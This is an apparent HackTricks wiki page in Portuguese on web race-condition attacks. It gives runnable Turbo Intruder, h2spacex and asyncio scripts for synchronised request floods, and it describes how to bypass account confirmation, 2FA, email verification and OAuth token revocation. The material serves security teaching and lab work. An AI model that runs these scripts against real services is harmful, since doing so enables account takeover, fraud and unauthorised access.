# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Para obter um entendimento aprofundado desta técnica, consulte o relatório original em [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Enhancing Race Condition Attacks

O principal obstáculo em aproveitar race conditions é garantir que múltiplas requests sejam tratadas ao mesmo tempo, com uma diferença muito pequena em seus tempos de processamento — idealmente, menos de 1ms.

Aqui você pode encontrar algumas técnicas para Synchronizing Requests:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Suporta enviar duas requests sobre uma única conexão TCP, reduzindo o impacto do jitter de rede. Contudo, devido a variações no lado do servidor, duas requests podem não ser suficientes para um exploit consistente de race condition.
- **HTTP/1.1 'Last-Byte Sync'**: Permite pré-enviar a maior parte de 20-30 requests, retendo um pequeno fragmento, que é então enviado junto, alcançando chegada simultânea no servidor.

**Preparation for Last-Byte Sync** envolve:

1. Enviar headers e dados do body menos o byte final sem finalizar o stream.
2. Pausar por 100ms após o envio inicial.
3. Desabilitar TCP_NODELAY para utilizar o Nagle's algorithm para agrupar os frames finais.
4. Fazer ping para aquecer a conexão.

O envio subsequente dos frames retidos deve resultar na chegada deles em um único packet, verificável via Wireshark. Este método não se aplica a static files, que normalmente não estão envolvidos em RC attacks.

### Adapting to Server Architecture

Entender a arquitetura do alvo é crucial. Front-end servers podem rotear requests de forma diferente, afetando o timing. Aquecer conexões do lado do servidor de forma preemptiva, por meio de requests sem importância, pode normalizar o timing das requests.

#### Handling Session-Based Locking

Frameworks como o session handler do PHP serializam requests por session, potencialmente ocultando vulnerabilidades. Usar diferentes session tokens para cada request pode contornar esse problema.

#### Overcoming Rate or Resource Limits

Se o aquecimento de conexão for ineficaz, provocar intencionalmente atrasos de limite de rate ou de resource dos web servers através de um flood de dummy requests pode facilitar o single-packet attack, induzindo um delay do lado do servidor que favorece race conditions.

## Attack Examples

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: Você pode enviar a request para **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), alterar na request o valor que quer brute force para **`%s`** como em `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` e então selecionar o **`examples/race-single-packer-attack.py`** no menu suspenso:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Se você for enviar **send different values**, você pode modificar o código com este que usa uma wordlist do clipboard:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Se o site não suportar HTTP2 (apenas HTTP1.1) use `Engine.THREADED` ou `Engine.BURP` em vez de `Engine.BURP2`.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: Caso você precise enviar uma requisição para 1 endpoint e depois várias para outros endpoints para acionar a RCE, você pode alterar o script `race-single-packet-attack.py` para algo como:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Também está disponível no **Repeater** através da nova opção '**Send group in parallel**' do Burp Suite.
- Para **limit-overrun** você pode simplesmente adicionar a **mesma request 50 vezes** no **group**.
- Para **connection warming**, você pode **adicionar**, no **início** do **group**, algumas **requests** para alguma parte não estática do servidor web.
- Para **delaying** o processo **entre** o processamento **de uma request e outra** em dois passos de substates, você pode **adicionar requests extras entre** as duas requests.
- Para um **multi-endpoint** RC você pode começar enviando a **request** que **vai para o hidden state** e então **50 requests** logo depois que **exploram o hidden state**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: O objetivo deste script é alterar o email de um usuário enquanto verifica continuamente até que o token de verificação do novo email chegue ao último email (isso aconteceu porque no código havia um RC onde era possível modificar um email mas a verificação era enviada para o antigo, pois a variável indicando o email já estava populada com o primeiro).\
Quando a palavra "objetivo" é encontrada nos emails recebidos, sabemos que recebemos o token de verificação do email alterado e encerramos o ataque.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: notas sobre engine e gating

- Seleção de engine: use `Engine.BURP2` em alvos HTTP/2 para disparar o single‑packet attack; use `Engine.THREADED` ou `Engine.BURP` como fallback para sincronização last‑byte em HTTP/1.1.
- `gate`/`openGate`: enfileire muitas cópias com `gate='race1'` (ou gates por tentativa), que retém a cauda de cada requisição; `openGate('race1')` libera todas as caudas juntas para que cheguem quase simultaneamente.
- Diagnóstico: timestamps negativos no Turbo Intruder indicam que o servidor respondeu antes da requisição ser totalmente enviada, confirmando sobreposição. Isso é esperado em condições de corrida reais.
- Aquecimento de conexão: envie um ping ou algumas requisições inofensivas primeiro para estabilizar os tempos; opcionalmente desative `TCP_NODELAY` para encorajar o agrupamento dos frames finais.

### Melhorando Single Packet Attack

Na pesquisa original é explicado que esse ataque tem um limite de 1.500 bytes. No entanto, em [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), foi explicado como é possível estender a limitação de 1.500 bytes do single packet attack para a **limitação de janela de 65,535 B do TCP usando fragmentação na camada IP** (dividindo um único pacote em múltiplos pacotes IP) e enviando-os em ordens diferentes, o que impede a remontagem do pacote até que todos os fragmentos cheguem ao servidor. Essa técnica permitiu ao pesquisador enviar 10.000 requisições em cerca de 166 ms.

Observe que, embora essa melhoria torne o ataque mais confiável em RC que requer centenas/milhares de pacotes para chegarem ao mesmo tempo, ela também pode ter limitações de software. Alguns servidores HTTP populares como Apache, Nginx e Go têm uma configuração estrita `SETTINGS_MAX_CONCURRENT_STREAMS` definida para 100, 128 e 250. No entanto, outros como NodeJS e nghttp2 a têm ilimitada.\
Isso basicamente significa que o Apache considerará apenas 100 conexões HTTP a partir de uma única conexão TCP (limitando este ataque RC).

Você pode encontrar alguns exemplos usando essa técnica no repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Antes da pesquisa anterior, estes eram alguns payloads usados que apenas tentavam enviar os pacotes o mais rápido possível para causar um RC.

- **Repeater:** Consulte os exemplos da seção anterior.
- **Intruder**: Envie o **request** para o **Intruder**, defina o **number of threads** para **30** dentro do **Options menu**, selecione como payload **Null payloads** e gere **30**.
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **Metodologia RC**

### Extrapolação de limite / TOCTOU

Este é o tipo mais básico de race condition onde **vulnerabilidades** que **aparecem** em pontos que **limitam o número de vezes que você pode realizar uma ação**. Como usar o mesmo código de desconto em uma loja web várias vezes. Um exemplo bem simples pode ser encontrado em [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ou em [**this bug**](https://hackerone.com/reports/759247)**.**

Existem muitas variações desse tipo de ataque, incluindo:

- Resgatar um cartão-presente várias vezes
- Avaliar um produto várias vezes
- Sacar ou transferir dinheiro além do saldo da sua conta
- Reutilizar a mesma solução de CAPTCHA
- Contornar um rate limit anti-brute-force

### **Subestados ocultos**

Explorar race conditions complexas frequentemente envolve aproveitar breves oportunidades para interagir com subestados de máquina ocultos ou **não intencionais**. Aqui está como abordar isto:

1. **Identificar Subestados Ocultos Potenciais**
- Comece localizando endpoints que modificam ou interagem com dados críticos, como perfis de usuário ou processos de reset de senha. Foque em:
- **Armazenamento**: Prefira endpoints que manipulam dados persistentes no lado do servidor em vez daqueles que lidam com dados no lado do cliente.
- **Ação**: Procure operações que alterem dados existentes, que têm maior probabilidade de criar condições exploráveis em comparação com as que adicionam novos dados.
- **Chaveamento**: Ataques bem-sucedidos normalmente envolvem operações indexadas pela mesma identificação, por exemplo, nome de usuário ou token de reset.
2. **Realizar sondagem inicial**
- Teste os endpoints identificados com ataques de race condition, observando quaisquer desvios dos resultados esperados. Respostas inesperadas ou mudanças no comportamento da aplicação podem sinalizar uma vulnerabilidade.
3. **Demonstrar a Vulnerabilidade**
- Reduza o ataque ao número mínimo de requisições necessárias para explorar a vulnerabilidade, frequentemente apenas duas. Este passo pode requerer múltiplas tentativas ou automação devido ao timing preciso envolvido.

### Ataques Sensíveis ao Tempo

Precisão na temporização das requisições pode revelar vulnerabilidades, especialmente quando métodos previsíveis como timestamps são usados para tokens de segurança. Por exemplo, gerar tokens de redefinição de senha baseados em timestamps pode permitir tokens idênticos para requisições simultâneas.

**Para Explorar:**

- Use temporização precisa, como um ataque de pacote único, para fazer requisições de password reset concorrentes. Tokens idênticos indicam uma vulnerabilidade.

**Exemplo:**

- Solicite dois tokens de password reset ao mesmo tempo e compare-os. Tokens iguais sugerem uma falha na geração de tokens.

**Confira** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **para experimentar isso.**

## Estudos de caso de subestados ocultos

### Pagar e adicionar um item

Confira este [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) para ver como **pagar** em uma loja e **adicionar um item extra** que você **não precisará pagar**.

### Confirmar outros emails

A ideia é **verificar um endereço de email e alterá-lo para outro ao mesmo tempo** para descobrir se a plataforma verifica o novo endereço.

### Alterar email para 2 endereços de email — baseado em Cookie

De acordo com [**this research**](https://portswigger.net/research/smashing-the-state-machine) o Gitlab estava vulnerável a um takeover dessa forma porque poderia **enviar** o **token de verificação de email de um email para o outro**.

**Confira** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **para experimentar isso.**

### Estados ocultos do banco de dados / Bypass de Confirmação

Se **2 gravações diferentes** são usadas para **adicionar** **informação** dentro de um **banco de dados**, existe uma pequena janela de tempo onde **apenas os primeiros dados foram escritos** no banco de dados. Por exemplo, ao criar um usuário o **nome de usuário** e a **senha** podem ser **gravados** e **depois o token** para confirmar a conta recém-criada é escrito. Isso significa que por um pequeno intervalo o **token para confirmar uma conta é nulo**.

Portanto, **registrar uma conta e enviar várias requisições com um token vazio** (`token=` or `token[]=` or any other variation) para confirmar a conta imediatamente poderia permitir **confirmar uma conta** cuja caixa de email você não controla.

**Confira** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **para experimentar isso.**

### Bypass 2FA

O pseudo-código a seguir é vulnerável a race condition porque em uma janela muito pequena a **2FA não é aplicada** enquanto a sessão é criada:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 persistência eterna

Existem vários [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Esses serviços permitem que você crie uma aplicação e autentique usuários que o provider registrou. Para isso, o **client** precisará **permitir que sua aplicação** acesse parte dos dados deles dentro do **OAUth provider**.\
Ou seja, até aqui é apenas um login comum com google/linkedin/github... onde você vê uma página dizendo: "_Application \<InsertCoolName> quer acessar suas informações, deseja permitir?_"

#### Race Condition em `authorization_code`

O **problema** aparece quando você **o aceita** e isso envia automaticamente um **`authorization_code`** para a aplicação maliciosa. Em seguida, essa **aplicação abusa de um Race Condition no OAUth service provider para gerar mais de um AT/RT** (_Authentication Token/Refresh Token_) a partir do **`authorization_code`** para sua conta. Basicamente, ela vai explorar o fato de que você aceitou que a aplicação acesse seus dados para **criar várias contas**. Então, se você **deixar de permitir que a aplicação acesse seus dados, um par de AT/RT será excluído, mas os outros ainda permanecerão válidos.**

#### Race Condition em `Refresh Token`

Uma vez que você tenha **obtido um RT válido** você pode tentar **abusar dele para gerar vários AT/RT** e **mesmo se o usuário cancelar as permissões** da aplicação maliciosa para acessar seus dados, **vários RTs ainda permanecerão válidos.**

## **RC em WebSockets**

- Em [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) você pode encontrar um PoC em Java para enviar mensagens websocket em **paralelo** para abusar de **Race Conditions também em Web Sockets**.
- Com o Burp’s WebSocket Turbo Intruder você pode usar o engine **THREADED** para gerar múltiplas conexões WS e disparar payloads em paralelo. Comece pelo exemplo oficial e ajuste `config()` (contagem de threads) para concorrência; isso costuma ser mais confiável do que agrupar em uma única conexão ao competir pelo estado do lado do servidor entre handlers WS. Veja [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## Referências

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
